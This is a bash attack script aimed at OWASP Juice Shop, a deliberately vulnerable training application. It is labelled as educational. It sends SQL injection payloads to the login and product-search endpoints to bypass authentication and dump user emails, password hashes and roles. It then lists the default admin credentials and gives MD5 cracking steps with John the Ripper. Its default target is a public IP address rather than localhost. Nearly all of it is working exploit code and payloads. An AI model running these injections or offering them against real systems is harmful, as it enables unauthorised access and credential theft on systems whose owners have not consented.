#!/bin/bash

# OWASP Juice Shop Admin Password Extraction via SQL Injection
# Educational purposes only!

echo "======================================"
echo "Juice Shop Admin Password Extractor"
echo "======================================"
echo ""

# Target URL (modify as needed)
read -p "Enter Juice Shop URL (e.g., http://localhost:3000): " BASE_URL

if [ -z "$BASE_URL" ]; then
    BASE_URL="http://66.42.93.220:3000"
    echo "Using default: $BASE_URL"
fi

echo ""
echo "[1] Method 1: Login SQL Injection"
echo "=================================="
echo "Trying SQL injection on login endpoint..."

# Try basic SQL injection to bypass login
curl -X POST "$BASE_URL/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"anything"}' \
  2>/dev/null | python3 -m json.tool

echo ""
echo "[2] Method 2: Search SQL Injection to Extract Users"
echo "===================================================="
echo "Extracting user data via search..."

# SQL injection via search to get users
PAYLOAD="%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2Crole%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20FROM%20Users--"
curl -s "$BASE_URL/rest/products/search?q=$PAYLOAD" | python3 -m json.tool

echo ""
echo "[3] Method 3: Direct Admin Login Bypass"
echo "========================================"
echo "Attempting to login as admin directly..."

# Try to login with admin email and SQL injection
curl -X POST "$BASE_URL/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'"'"'--","password":"anything"}' \
  2>/dev/null | python3 -m json.tool

echo ""
echo "[4] Known Admin Credentials"
echo "============================"
echo "Default Juice Shop Admin:"
echo "Email: admin@juice-sh.op"
echo "Password: admin123"
echo "MD5 Hash: 0192023a7bbd73250516f069df18b500"

echo ""
echo "[5] Manual SQL Injection Payloads"
echo "=================================="
echo "Try these in the login email field:"
echo "1. ' OR '1'='1'--"
echo "2. admin@juice-sh.op'--"
echo "3. ' OR 1=1--"
echo "4. ') OR ('1'='1'--"

echo ""
echo "[6] Extracting Password Hash"
echo "============================="
echo "Use this in search bar:"
echo "')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--"

echo ""
echo "[7] Cracking the Hash"
echo "====================="
echo "If you extract the hash (0192023a7bbd73250516f069df18b500):"
echo "1. Use online tool: https://crackstation.net"
echo "2. Or use John the Ripper:"
echo "   echo '0192023a7bbd73250516f069df18b500' > admin.hash"
echo "   john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin.hash"
echo "3. Result: admin123"